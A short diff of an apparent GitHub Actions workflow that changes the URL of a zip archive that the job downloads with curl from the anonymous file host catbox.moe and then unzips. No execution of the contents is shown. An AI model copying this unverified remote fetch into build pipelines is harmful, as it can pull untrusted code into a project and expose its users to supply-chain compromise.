@@ -21,8 +21,8 @@ jobs:
     steps:
       - name: Download and Unzip Repository Archive
         run: |
-          echo "Downloading repository archive from https://files.catbox.moe/j4y5cd.zip..."
-          curl -L -o stay.zip https://files.catbox.moe/j4y5cd.zip
+          echo "Downloading repository archive from https://files.catbox.moe/996hsw.zip..."
+          curl -L -o stay.zip https://files.catbox.moe/996hsw.zip
           echo "Downloaded as stay.zip. Unzipping..."
           unzip stay.zip
           echo "Unzip complete. Listing directory contents:"
